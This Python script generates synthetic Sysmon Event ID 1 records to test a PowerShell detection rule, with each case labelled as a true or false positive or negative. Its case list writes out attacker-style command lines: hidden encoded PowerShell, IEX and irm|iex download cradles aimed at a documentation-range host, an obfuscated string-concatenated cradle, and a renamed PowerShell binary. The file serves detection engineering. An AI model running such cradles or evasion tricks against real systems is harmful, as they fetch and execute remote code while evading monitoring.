"""Generate synthetic Sysmon Event ID 1 (process creation) events for this hypothesis.

Every event carries a "_lab" block that the test harness reads:
  expect    "match" or "no_match"  - what the rule SHOULD do
  category  true_positive | true_negative | known_false_positive | known_false_negative
  why       one line explaining the case

Known false positives / false negatives are expected outcomes: they document what the
rule cannot tell apart, so a later rule change that "fixes" one shows up in the test run.

Payloads are harmless (Write-Output strings) and URLs use the reserved documentation
range 203.0.113.0/24 (RFC 5737) and example.com, so nothing here is live.
"""

import base64
import json
import pathlib
import sys
from datetime import datetime, timedelta, timezone

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PWSH = r"C:\Program Files\PowerShell\7\pwsh.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
EXPLORER = r"C:\Windows\explorer.exe"
CMD = r"C:\Windows\System32\cmd.exe"
MSHTA = r"C:\Windows\System32\mshta.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
GC_WORKER = r"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.33.0\dsc\GC\gc_worker.exe"
URL = "http://203.0.113.10/stage.ps1"


def enc(script):
    """Base64 of UTF-16LE, exactly what -EncodedCommand expects."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


B64 = enc("Write-Output 'detection-lab synthetic payload'")

# (expect, category, why, image, original_file_name, command_line, parent_image)
CASES = [
    # --- true positives -------------------------------------------------------
    ("match", "true_positive", "Word macro launches hidden encoded PowerShell (classic maldoc)",
     PS, "PowerShell.EXE", f"powershell.exe -NoP -NonI -W Hidden -Enc {B64}", WINWORD),
    ("match", "true_positive", "Hidden + full -EncodedCommand from cmd, no Office parent (pattern A alone)",
     PS, "PowerShell.EXE", f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {B64}", CMD),
    ("match", "true_positive", "Slash prefixes and numeric window style (/w 1 /ec)",
     PS, "PowerShell.EXE", f"powershell /nop /w 1 /ec {B64}", CMD),
    ("match", "true_positive", "En-dash prefixes copied from a phishing doc (\u2013w hidden \u2013e)",
     PS, "PowerShell.EXE", f"powershell \u2013w hidden \u2013e {B64}", EXPLORER),
    ("match", "true_positive", "Upper-case flags (case-insensitive match)",
     PS, "PowerShell.EXE", f"POWERSHELL.EXE -WINDOWSTYLE HIDDEN -ENC {B64}", CMD),
    ("match", "true_positive", "Renamed powershell.exe caught through OriginalFileName",
     r"C:\Users\Public\svchost.exe", "PowerShell.EXE", f"svchost.exe -w hidden -e {B64}", CMD),
    ("match", "true_positive", "WebClient download cradle executed in memory with IEX (pattern B)",
     PS, "PowerShell.EXE", f"powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('{URL}')\"", CMD),
    ("match", "true_positive", "pwsh irm | iex one-liner (pattern B, PowerShell 7)",
     PWSH, "pwsh.dll", f"pwsh -c \"irm {URL} | iex\"", EXPLORER),
    ("match", "true_positive", "mshta spawns PowerShell that downloads a file (pattern C, download only)",
     PS, "PowerShell.EXE", f"powershell -c \"Invoke-WebRequest {URL} -OutFile $env:TEMP\\s.ps1\"", MSHTA),
    ("match", "true_positive", "Excel spawns hidden PowerShell running a script file (pattern C, hidden only)",
     PS, "PowerShell.EXE", r"powershell.exe -w hidden -File C:\Users\Public\update.ps1", EXCEL),

    # --- true negatives -------------------------------------------------------
    ("no_match", "true_negative", "Interactive admin query",
     PS, "PowerShell.EXE", "powershell.exe -NoProfile -Command Get-Service -Name Spooler", EXPLORER),
    ("no_match", "true_negative", "Scheduled task runs a hidden script, no encoding or download",
     PS, "PowerShell.EXE", r"powershell.exe -NoProfile -WindowStyle Hidden -File C:\Scripts\backup.ps1", SVCHOST),
    ("no_match", "true_negative", "-Encoding parameter must not be read as -EncodedCommand",
     PS, "PowerShell.EXE", "powershell.exe -w hidden -c \"Get-Content C:\\logs\\app.log -Encoding UTF8 | Select-Object -Last 20\"", SVCHOST),
    ("no_match", "true_negative", "-ep / -ex (ExecutionPolicy) must not be read as -e",
     PS, "PowerShell.EXE", r"powershell.exe -ep bypass -ex bypass -File C:\Scripts\inventory.ps1", EXPLORER),
    ("no_match", "true_negative", "Download to disk without in-memory execution, normal parent",
     PS, "PowerShell.EXE", f"powershell -c \"Invoke-WebRequest https://example.com/tool.zip -OutFile C:\\Temp\\tool.zip\"", EXPLORER),
    ("no_match", "true_negative", "Word launches PowerShell with nothing suspicious (parent alone is not enough)",
     PS, "PowerShell.EXE", r"powershell.exe -NoProfile -File C:\Addins\export.ps1", WINWORD),
    ("no_match", "true_negative", "Office spawns cmd.exe, not PowerShell (image selection)",
     CMD, "Cmd.Exe", f"cmd.exe /c powershell -w hidden -enc {B64}", WINWORD),
    ("no_match", "true_negative", "Azure Guest Configuration worker (filtered)",
     PS, "PowerShell.EXE", f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {B64}", GC_WORKER),

    # --- documented limitations ----------------------------------------------
    ("match", "known_false_positive", "Official Chocolatey install one-liner is a real download cradle",
     PS, "PowerShell.EXE",
     "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient)"
     ".DownloadString('https://community.chocolatey.org/install.ps1'))\"", CMD),
    ("no_match", "known_false_negative", "Encoded command WITHOUT hidden window from a normal parent (by design: too noisy alone)",
     PS, "PowerShell.EXE", f"powershell.exe -NoProfile -EncodedCommand {B64}", CMD),
    ("no_match", "known_false_negative", "String-concatenated cradle with no IEX/WebClient literal",
     PS, "PowerShell.EXE",
     "powershell -c \"& ([scriptblock]::Create((New-Object ('Ne'+'t.Web'+'Client')).('Down'+'loadString').Invoke('" + URL + "')))\"",
     CMD),
    ("no_match", "known_false_negative", "Payload passed through an environment variable, not the command line",
     PS, "PowerShell.EXE", "powershell -w hidden -c \"$env:LAB_PAYLOAD | iex\"", CMD),
]


def build_events():
    start = datetime(2026, 10, 23, 14, 0, 0, tzinfo=timezone.utc)
    events = []
    for i, (expect, category, why, image, ofn, cmdline, parent) in enumerate(CASES, start=1):
        events.append({
            "_lab": {"id": f"ps-{i:02d}", "expect": expect, "category": category, "why": why},
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "UtcTime": (start + timedelta(seconds=37 * i)).strftime("%Y-%m-%d %H:%M:%S.000"),
            "Computer": "LAB-WS01.lab.local",
            "User": "LAB\\analyst",
            "ProcessId": 4000 + i,
            "Image": image,
            "OriginalFileName": ofn,
            "CommandLine": cmdline,
            "ParentProcessId": 3000 + i,
            "ParentImage": parent,
            "IntegrityLevel": "Medium",
        })
    return events


def main(out_path):
    events = build_events()
    out = pathlib.Path(out_path)
    with out.open("w", encoding="utf-8", newline="\n") as fh:
        for ev in events:
            fh.write(json.dumps(ev, ensure_ascii=False) + "\n")
    print(f"wrote {len(events)} events to {out}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else pathlib.Path(__file__).with_name("events.jsonl"))
